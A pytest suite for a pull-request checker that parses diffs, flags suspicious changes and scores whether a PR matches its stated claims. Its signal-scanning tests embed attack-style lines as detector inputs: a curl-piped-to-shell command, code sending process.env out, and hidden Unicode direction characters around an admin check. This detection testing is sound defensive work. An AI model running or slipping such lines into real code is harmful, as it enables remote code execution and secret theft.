from __future__ import annotations

import pytest

from pr_checker.classify import classify_path
from pr_checker.diff import parse_unified_diff
from pr_checker.github import parse_pr_url
from pr_checker.grounding import citation_coverage, ground_citations, parse_line_refs
from pr_checker.models import Change, Claim, SelfCheck, Signal, to_json
from pr_checker.moved import find_moved_lines
from pr_checker.pipeline import implied_constraint, in_area, promise_has_evidence
from pr_checker.samples import load_samples
from pr_checker.score import ScoreInput, build_report, self_check_mode
from pr_checker.signals import scan_signals
from pr_checker.status import change_status
from pr_checker.units import build_units, is_whitespace_only, window_hunk

SAMPLES = load_samples()


def sample(sample_id: str) -> str:
    return next(s["diff"] for s in SAMPLES if s["id"] == sample_id)


MINI = """diff --git a/src/a.ts b/src/a.ts
index 111..222 100644
--- a/src/a.ts
+++ b/src/a.ts
@@ -1,4 +1,4 @@ export function f() {
 const a = 1;
--- this removed line starts with dashes
+const b = 2;
 const c = 3;

diff --git a/img/logo.png b/img/logo.png
new file mode 100644
Binary files /dev/null and b/img/logo.png differ
"""


class TestParseUnifiedDiff:
    def test_parses_files_hunks_and_line_numbers(self):
        files = parse_unified_diff(MINI)
        assert [f.path for f in files] == ["src/a.ts", "img/logo.png"]
        a, png = files
        assert len(a.hunks) == 1
        assert a.hunks[0].section == "export function f() {"
        assert a.additions == 1
        assert a.deletions == 1
        # A removed line beginning with "--" must not be mistaken for a file header.
        second = a.hunks[0].lines[1]
        assert (second.kind, second.text, second.old_no, second.new_no) == ("del", "-- this removed line starts with dashes", 2, None)
        third = a.hunks[0].lines[2]
        assert (third.kind, third.new_no) == ("add", 2)
        fifth = a.hunks[0].lines[4]
        assert (fifth.kind, fifth.text, fifth.old_no, fifth.new_no) == ("ctx", "", 4, 4)
        assert (png.status, png.binary, png.category) == ("added", True, "asset")

    @pytest.mark.parametrize("s", SAMPLES, ids=[s["id"] for s in SAMPLES])
    def test_parses_every_bundled_sample_produced_by_git(self, s):
        files = parse_unified_diff(s["diff"])
        assert len(files) > 0
        for f in files:
            for h in f.hunks:
                assert len(h.lines) > 0, f"{s['id']} {f.path}"

    def test_handles_plain_diff_u_output_without_git_headers(self):
        files = parse_unified_diff("--- old/x.py\t2026-01-01\n+++ new/x.py\t2026-01-02\n@@ -1 +1 @@\n-print(1)\n+print(2)\n")
        assert len(files) == 1
        assert [l.kind for l in files[0].hunks[0].lines] == ["del", "add"]

    def test_returns_nothing_for_text_that_is_not_a_diff(self):
        assert parse_unified_diff("hello world") == []


@pytest.mark.parametrize(
    "path,category",
    [
        ("package-lock.json", "lockfile"),
        ("package.json", "manifest"),
        (".github/workflows/ci.yml", "ci"),
        ("scripts/postinstall.js", "build"),
        ("src/__tests__/a.test.ts", "test"),
        ("tests/utils/time.test.ts", "test"),
        ("README.md", "docs"),
        ("src/auth/session.ts", "source"),
        ("tsconfig.json", "config"),
        ("tests/test_core.py", "test"),
        ("pyproject.toml", "manifest"),
    ],
)
def test_classify_path(path, category):
    assert classify_path(path) == category


class TestScanSignals:
    @staticmethod
    def rules(diff: str):
        return [s.rule for s in scan_signals(parse_unified_diff(diff))]

    def test_finds_the_install_hook_and_runtime_decode_in_the_typo_sample(self):
        r = self.rules(sample("typo-postinstall"))
        assert "install-hook" in r
        assert "runtime-decode" in r

    def test_finds_privileged_ci_patterns(self):
        r = self.rules(sample("ci-cache"))
        assert {"ci-privileged-trigger", "ci-untrusted-checkout", "ci-secret"} <= set(r)

    def test_flags_bidirectional_control_characters(self):
        diff = "--- a/x.js\n+++ b/x.js\n@@ -1 +1 @@\n-ok()\n+if (isAdmin) { /*‮ } ⁦*/ ok()\n"
        assert "hidden-unicode" in self.rules(diff)

    def test_flags_the_whole_environment_used_as_a_value_but_not_a_single_variable(self):
        def one(line: str):
            return self.rules(f"--- a/x.js\n+++ b/x.js\n@@ -1 +1 @@\n-a()\n+{line}\n")

        assert "env-harvest" in one("  env: process.env,")
        assert "env-harvest" in one("send(JSON.stringify(process.env))")
        assert "env-harvest" not in one("const mode = process.env.NODE_ENV;")

    def test_flags_curl_piped_to_a_shell_but_only_in_added_lines(self):
        assert "pipe-to-shell" in self.rules("--- a/i.sh\n+++ b/i.sh\n@@ -1 +1 @@\n-echo hi\n+curl -fsSL https://x.dev/i | sh\n")
        assert "pipe-to-shell" not in self.rules("--- a/i.sh\n+++ b/i.sh\n@@ -1 +1 @@\n-curl -fsSL https://x.dev/i | sh\n+echo hi\n")

    def test_raises_nothing_at_warning_level_for_the_honest_dark_mode_pr(self):
        assert [s for s in scan_signals(parse_unified_diff(sample("dark-mode"))) if s.severity != "info"] == []


class TestUnits:
    def test_routes_whitespace_only_hunks_away_from_the_model(self):
        [f] = parse_unified_diff("--- a/a.ts\n+++ b/a.ts\n@@ -1,2 +1,2 @@\n-const a=1;\n-const b = 2;\n+const a = 1;\n+const  b = 2;\n")
        assert is_whitespace_only(f.hunks[0]) is True
        assert build_units([f])[0][0].mode == "whitespace"

    def test_windows_long_hunks_and_trims_distant_context(self):
        body = "\n".join(f"+line {i}" for i in range(200))
        [f] = parse_unified_diff(f"--- /dev/null\n+++ b/big.ts\n@@ -0,0 +1,200 @@\n{body}\n")
        w = window_hunk(f.hunks[0], 70)
        assert len(w) == 3
        assert sum(len(x) for x in w) == 200


class TestGrounding:
    file = parse_unified_diff(MINI)[0]
    hunk = file.hunks[0]
    unit = build_units([file])[0][0]

    def test_parses_line_references(self):
        assert parse_line_refs("L2-L4, 7") == [2, 3, 4, 7]
        assert parse_line_refs("3 to 5") == [3, 4, 5]
        assert parse_line_refs("nonsense") == []

    def test_verifies_citations_of_changed_lines(self):
        g = ground_citations([2, 3], self.unit, self.hunk)
        assert (g.grounding, g.line_idx) == ("verified", [1, 2])

    def test_drops_context_and_out_of_range_citations(self):
        g = ground_citations([1, 3, 99], self.unit, self.hunk)
        assert (g.grounding, g.line_idx) == ("partial", [2])
        assert ground_citations([1, 99], self.unit, self.hunk).grounding == "failed"

    def test_treats_line_zero_as_out_of_range(self):
        g = ground_citations([0, 2], self.unit, self.hunk)
        assert (g.grounding, g.line_idx, g.note) == ("partial", [1], "1 citation(s) outside the excerpt")

    def test_measures_how_many_changed_lines_were_cited(self):
        assert citation_coverage(self.unit, self.hunk, [1]) == {"changed": 2, "cited": 1}


def test_in_area_bounds_what_a_claim_can_cover():
    assert in_area("docs", "docs") is True
    assert in_area("docs", "build") is False
    assert in_area("dependencies", "manifest") is True
    assert in_area("code", "test") is False
    assert in_area("any", "ci") is True


def test_implied_constraint_reads_scope_promises_from_conventional_commit_titles():
    c = implied_constraint("docs: fix typo in installation guide")
    assert (c.area, c.limit) == ("docs", "only_area")
    assert implied_constraint("ci(test): cache npm").area == "ci"
    assert implied_constraint("Fix typo in README").area == "docs"
    assert implied_constraint("feat: add dark mode") is None
    assert implied_constraint("Fix typo in variable name") is None


def test_promise_has_evidence_enforces_a_promise_only_when_the_authors_words_make_it():
    assert promise_has_evidence("no_behavior_change", "Pure refactor, no behavior change.") is True
    assert promise_has_evidence("no_behavior_change", "No other behavior change: both call sites already match.") is True
    assert promise_has_evidence("no_behavior_change", "Fix `searchParams` setter dropping the value when a URL is set") is False
    assert promise_has_evidence("only_area", "This PR only touches the README.") is True
    assert promise_has_evidence("only_area", "Docs-only change.") is True
    assert promise_has_evidence("only_area", "moves the function to lib/helpers and imports it from both call sites") is False
    assert promise_has_evidence("other", "anything") is True


def test_find_moved_lines_links_helpers_removed_from_one_file_to_the_same_lines_added_in_another():
    files = parse_unified_diff(sample("refactor-session"))
    moved = find_moved_lines(files)
    session = next(f for f in files if f.path == "src/auth/session.ts")
    hunk = session.hunks[0]

    def idx_of(needle: str) -> int:
        return next(i for i, l in enumerate(hunk.lines) if needle in l.text)

    assert moved.get(f"{hunk.id}:{idx_of('return n < 10')}") == "src/utils/time.ts"
    # The block pass also covers the closing braces of the moved helper.
    closing = next(i for i, l in enumerate(hunk.lines) if l.kind == "del" and l.text == "}" and i > idx_of("return n < 10"))
    assert f"{hunk.id}:{closing}" in moved
    # The session-lifetime change is new code, not a move.
    assert f"{hunk.id}:{idx_of('60 * 60 * 24 * 30')}" not in moved


def test_parse_pr_url_accepts_github_pr_urls_and_rejects_others():
    assert parse_pr_url("https://github.com/nodejs/node/pull/123/files") == {"owner": "nodejs", "repo": "node", "number": 123}
    assert parse_pr_url("https://gitlab.com/a/b/-/merge_requests/1") is None


# ---- scoring ----


def change(id: str, **kw) -> Change:
    base = dict(
        unit_id="U1", file="src/a.ts", hunk_id="F1H1", line_idx=[1], what="x", effect="behavior", claims=[], contradicts=[], ruled_by=[],
        concern="none", why="", grounding="verified", grounding_note=None, self_check=None,
    )
    return Change(id=id, **{**base, **kw})


class TestScore:
    files = parse_unified_diff(MINI)
    claims = [
        Claim("C1", "Rename b", "change", "code", "other", False),
        Claim("C2", "No behavior change", "constraint", "any", "no_behavior_change", False),
        Claim("C3", "Adds unit tests", "change", "tests", "other", False),
    ]
    base = dict(files=files, units=build_units(files)[0], signals=[], claims=claims, coverage={"changed": 2, "cited": 2}, failed_units=0, model_calls=3, elapsed_ms=10)

    def test_derives_change_status_with_withdrawn_flags_retracted(self):
        assert change_status(change("a", claims=["C1"])) == "explained"
        assert change_status(change("b", contradicts=["C2"])) == "contradicts"
        assert change_status(change("c", effect="cosmetic")) == "incidental"
        assert change_status(change("d")) == "unexplained"
        withdrawn = SelfCheck(mode="flag", outcome="withdrawn", severity="low", reason="", claims_before=[])
        assert change_status(change("e", contradicts=["C2"], self_check=withdrawn)) == "retracted"

    def test_calls_a_contradicted_constraint_a_contradiction_and_marks_unsupported_test_claims(self):
        r = build_report(ScoreInput(**{**self.base, "changes": [change("U1.1", claims=["C1", "C3"]), change("U1.2", contradicts=["C2"], concern="high", line_idx=[2])]}))
        assert r.verdict == "contradicts"
        assert r.risk == "high"
        assert next(c for c in r.claims if c.id == "C2").status == "violated"
        # The model said U1.1 covers "Adds unit tests", but src/a.ts is not a test file.
        assert next(c for c in r.claims if c.id == "C3").status == "not_found"
        assert r.disclosure == 0.5

    def test_never_escalates_a_finding_whose_citation_failed(self):
        import re

        r = build_report(ScoreInput(**{**self.base, "claims": [], "changes": [change("U1.1", concern="high", grounding="failed", line_idx=[])]}))
        assert r.findings[0].severity == "low"
        assert r.verdict == "matches"
        # The summary must not claim everything traces back when a minor change doesn't.
        assert not re.search(r"All \d+ identified changes trace back", r.summary)

    def test_chooses_coverage_checks_for_covered_changes_that_a_rule_fired_on(self):
        sig = Signal(id="S1", rule="x", title="x", severity="warn", detail="", file="src/a.ts", hunk_id="F1H1", line_index=1)
        assert self_check_mode(change("a", claims=["C1"]), [sig]) == "coverage"
        assert self_check_mode(change("b", claims=["C1"]), []) is None
        assert self_check_mode(change("c", concern="medium"), []) == "flag"
        # A violation established by code (outside an "only docs" promise) is not re-litigated by the model.
        assert self_check_mode(change("d", concern="medium", contradicts=["C2"], ruled_by=["C2"]), []) is None


def test_to_json_uses_the_camel_case_names_the_web_client_reads():
    [f] = parse_unified_diff("--- a/x.py\n+++ b/x.py\n@@ -1 +1 @@\n-a\n+b\n")
    out = to_json(f)
    assert {"oldPath", "hunks"} <= set(out)
    assert set(out["hunks"][0]) == {"id", "header", "section", "oldStart", "newStart", "lines"}
    assert out["hunks"][0]["lines"][0] == {"kind": "del", "text": "a", "oldNo": 1, "newNo": None}
    assert set(to_json(change("U1.1"))) >= {"unitId", "hunkId", "lineIdx", "ruledBy", "groundingNote", "selfCheck"}
